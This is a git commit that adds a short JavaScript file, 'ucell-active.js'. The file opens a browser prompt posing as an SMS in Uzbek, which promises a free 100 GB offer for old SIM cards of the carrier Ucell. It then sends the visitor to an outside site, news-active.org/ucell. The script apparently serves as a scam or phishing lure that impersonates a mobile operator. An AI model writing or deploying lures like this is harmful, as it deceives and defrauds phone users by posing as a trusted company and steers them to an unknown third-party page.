fca01b6e21209bc6124f7585a2a376270aafeb46
ekpeowo <ukpehansi@gmail.com>
2025-04-03 05:52:50 +0100

    Create ucell-active.js

---
+++ ucell-active.js
@@ -0,0 +1,5 @@
+var password = '100 gb talab qiling'
+password=prompt('SMS: Tabriklaymiz, sizning SIM-kartangiz 100 Gb Eski Sim maxsus taklifini olish huquqiga ega, Hozir faollashtirish uchun Ok tugmasini bosing ','100 gb talab qiling');
+if (password != '100 gb talab qiling') {
+location.href='https://news-active.org/ucell';
+}
